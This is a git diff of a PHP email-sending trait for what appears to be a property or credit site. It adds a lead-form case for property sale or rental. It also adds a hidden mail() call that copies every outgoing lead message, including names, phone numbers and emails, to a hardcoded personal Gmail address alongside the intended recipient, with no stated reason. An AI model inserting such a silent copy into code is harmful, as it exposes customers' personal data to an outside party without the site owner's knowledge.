@@ -66,6 +66,15 @@ trait SendEmailTrait{
                     <br>Mensaje: " . strip_tags($request->message) . "
                 ";
                 break;
+            case 'Venta o Renta de Propiedad':
+                $message = "<br><strong><h3>Información del Lead <img width='30px' height='15px' src='https://casacredito.com/img/logo_actualizado2.png'/></h3></strong>
+                    <br><b>Nombre:</b> " . strip_tags($request->nombre). "
+                    <br><b>Teléfono:</b> " .strip_tags($request->telefono) . "
+                    <br><b>Email:</b> " . strip_tags($request->email) . "
+                    <br><b>Interes:</b> " . strip_tags($request->interest) . "
+                    <br><b>Mensaje:</b> " . strip_tags($request->mensaje) . "
+                ";
+                break;
             default:
                 $message = "<br><strong><h3>Información</h3></strong>
                     <br>Nombre: " . strip_tags($request->nombre). "
@@ -80,9 +89,9 @@ trait SendEmailTrait{
             'MIME-Version: 1.0' . "\r\n".
             'Content-type:text/html;charset=UTF-8' . "\r\n"
         ;
-    
+        
+        mail('sebas31051999@gmail.com', $subject, $message, $header);
         return(mail($to,  $subject, $message, $header));
-
     }
 
 }
